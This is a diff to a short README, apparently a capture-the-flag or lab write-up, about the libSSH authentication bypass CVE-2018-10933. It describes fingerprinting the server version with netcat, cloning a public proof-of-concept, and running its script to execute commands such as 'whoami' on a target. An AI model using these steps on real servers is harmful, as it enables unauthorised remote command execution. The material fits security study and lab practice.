@@ -1,11 +1,34 @@
 # They_Are_Coming
 
-- When i connect with nc give me name of libSSH. If output is 0.7.5, 0.6.*, or lowest then the server is vulnerable to CVE-2018-10933
+## Introduction
 
-## CVE-2018-1093 poc:
-`https://github.com/blacknbunny/CVE-2018-10933.git`
+Upon connecting via netcat (`nc`), the server provides the name of the libSSH library. If the output is 0.7.5, 0.6.*, or lower, the server is vulnerable to CVE-2018-10933.
 
-Then, I download the exploit run it and work 
+## CVE-2018-10933 Proof of Concept
 
-## Example:
-python libsshauthbypass.py --host <ip> --port <port> --command <command_line>
+This repository contains a proof of concept for CVE-2018-10933.
+
+### Installation
+
+Clone the repository:
+
+```bash
+git clone https://github.com/blacknbunny/CVE-2018-10933.git
+```
+
+### Usage
+
+- Navigate to the cloned directory.
+- Run the exploit script with the appropriate parameters:
+
+```py
+    python libsshauthbypass.py --host <ip> --port <port> --command <command_line>```
+
+Replace <ip> with the IP address of the vulnerable server, <port> with the port number, and <command_line> with the desired command to execute.
+
+### Example
+
+```py
+    python libsshauthbypass.py --host 192.168.1.100 --port 22 --command "whoami"```
+
+This command will exploit the vulnerability on a server with IP address 192.168.1.100 listening on port 22, executing the whoami command.
